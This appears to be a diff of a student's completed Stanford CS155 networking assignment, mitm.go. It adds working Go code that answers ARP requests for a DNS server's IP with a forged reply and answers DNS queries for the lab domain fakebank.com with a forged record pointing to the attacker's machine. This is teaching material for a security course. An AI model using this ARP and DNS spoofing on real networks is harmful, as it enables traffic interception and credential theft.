@@ -1,6 +1,6 @@
 /*
  * Stanford CS155 Project 3 Networking Part 3. Monster-in-the-Middle Attack
- *
+ * desktop
  * mitm.go When completed (by you!) and compiled, this program will:
  *
  * * Intercept and spoof DNS questions for fakebank.com to instead direct the
@@ -87,10 +87,10 @@ func handleARPPacket(packet gopacket.Packet) {
 			//
 			dstIP := net.IP(arpData.DstProtAddress)
 			// filter for ARP request coming to DNS server
-			if dstIP.String() == "10.2.3.4" {
+			// println(dstIP.String())
+			if dstIP.String() == "10.38.8.2" {
 				intercept := ARPIntercept{arpData.SourceHwAddress, arpData.SourceProtAddress,
 					arpData.DstHwAddress, arpData.DstProtAddress}
-
 				sendRawEthernet(spoofARP(intercept))
 			}
 			// Hint:	Store all the data you need in the ARPIntercept struct and
@@ -152,7 +152,6 @@ func spoofARP(intercept ARPIntercept) []byte {
 		SrcMAC:       cs155.GetLocalMAC(),
 		DstMAC:       intercept.SourceHwAddress,
 	}
-
 	// Now that the packet is ready to be sent, we need to "flatten" its
 	// different layers into raw bytes to send along the wire.
 	// These options will automatically calculate checksums and set them
@@ -241,6 +240,7 @@ func handleUDPPacket(packet gopacket.Packet) {
 
 	// Manually extract the payload of the UDP layer and parse it as DNS.
 	payload := udpLayer.(*layers.UDP).Payload
+
 	dnsPacketObj := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default)
 
 	// Check if the UDP packet contains a DNS packet within. Do nothing for non-DNS UDP packets
@@ -248,12 +248,19 @@ func handleUDPPacket(packet gopacket.Packet) {
 		// Type-switch the layer to the correct interface in order to operate on its member variables.
 		dnsData, _ := dnsLayer.(*layers.DNS)
 
-		if len(dnsData.Questions) > 0 {
+		if (len(dnsData.Questions) > 0) && (len(dnsData.Answers) == 0) { // also check packet has no answer in it
 			for _, element := range dnsData.Questions {
 				// 	DNSTypeA     DNSType = 1   // a host address
+				srcip := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP
+				dstip := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP
+				srcPrt := packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort
+				dstPrt := packet.Layer(layers.LayerTypeUDP).(*layers.UDP).DstPort
 
-				if string(element.Name[:]) == "fakebank.com" && element.Type == layers.DNSTypeA {
-
+				if string(element.Name) == "fakebank.com" && element.Type == layers.DNSTypeA {
+					intercept := dnsIntercept{srcip, dstip, srcPrt, dstPrt, dnsData.Questions[0]}
+					castPayload := gopacket.Payload(payload)
+					sendRawUDP(int(udpLayer.(*layers.UDP).SrcPort), packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP,
+						spoofDNS(intercept, castPayload))
 				}
 			}
 
@@ -285,6 +292,11 @@ type dnsIntercept struct {
 	// TODO #5: Determine what needs to be intercepted from the DNS request
 	//          for fakebank.com in order to craft a spoofed answer.
 
+	SrcIP     net.IP
+	DstIP     net.IP
+	SrcPrt    layers.UDPPort
+	DstPrt    layers.UDPPort
+	Questions layers.DNSQuestion
 }
 
 /*
@@ -310,16 +322,18 @@ func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
 	// TODO #6: Fill in the missing fields below to construct the base layers of
 	//          your spoofed DNS packet. If you are confused about what the Protocol
 	//          variable means, Google and IANA are your friends!
+	// println("dstip" + intercept.DstIP.String())
 	ip := &layers.IPv4{
 		// fakebank.com operates on IPv4 exclusively.
-		Version: 4,
-		// Protocol: TODO,
-		SrcIP: net.IP(cs155.GetLocalIP()),
-		// DstIP:    ,
+		Version:  4,
+		Protocol: layers.IPProtocolUDP,
+		SrcIP:    intercept.DstIP, //("10.38.8.2"),  // change to acutal
+		DstIP:    intercept.SrcIP,
 	}
+	// println(ip.Version)
 	udp := &layers.UDP{
-		// SrcPort: TODO,
-		// DstPort: TODO,
+		SrcPort: intercept.DstPrt,
+		DstPort: intercept.SrcPrt,
 	}
 
 	// The checksum for the level 4 header (which includes UDP) depends on
@@ -332,13 +346,37 @@ func spoofDNS(intercept dnsIntercept, payload gopacket.Payload) []byte {
 	// sequence of bytes into a DNS data structure.
 	dnsPacket := gopacket.NewPacket(payload, layers.LayerTypeDNS, gopacket.Default).Layer(layers.LayerTypeDNS)
 	dns, ok := dnsPacket.(*layers.DNS)
+	// dnsPacketObj.Layer(layers.LayerTypeDNS)
+	// dnsData, _ := dnsLayer.(*layers.DNS)
 	if !ok {
 		log.Panic("Tried to spoof a packet that doesn't appear to have a DNS layer.")
 	}
 
 	// TODO #7: Populate the DNS layer (dns) with your answer that points to the attack web server
 	//          Your business-minded friends may have dropped some hints elsewhere in the network!
-
+	ipAddress, _, _ := net.ParseCIDR(cs155.GetLocalIP())
+	dnsRecords := []layers.DNSResourceRecord{
+		{
+			Name:  intercept.Questions.Name,
+			Type:  layers.DNSTypeA,
+			IP:    ipAddress.To4(),
+			Class: layers.DNSClassIN,
+			TTL:   600,
+		},
+	}
+	dns.Answers = dnsRecords
+	dns.QR = true
+	dns.ANCount = 1
+	// dns.ResponseCode = layers.DNSResponseCodeNoErr
+	dns.ResponseCode = layers.DNSResponseCodeNoErr
+	// dnsAnswer.Type = layers.DNSTypeA
+	// dnsAnswer.IP = ipAddress
+	// // This just copies the domain name, but as a byte array.
+	// dnsAnswer.Name = request.Questions[0].Name
+	// // IN stands for internet - it is the namespace of this DNS request/reply.
+	// // DNS can be used for protocols other than internet, but that's
+	// // obviously beyond the scope of this project.
+	// dnsAnswer.Class = layers.DNSClassIN
 	// Now we're ready to seal off and send the packet.
 	// Serialization refers to "flattening" a packet's different layers into a
 	// raw stream of bytes to be sent over the network.
@@ -383,6 +421,7 @@ func sendRawUDP(port int, dest []byte, toSend []byte) {
 	if err := unix.Close(outFD); err != nil {
 		log.Panic(err)
 	}
+	// println("finalUDP")
 }
 
 // ==============================
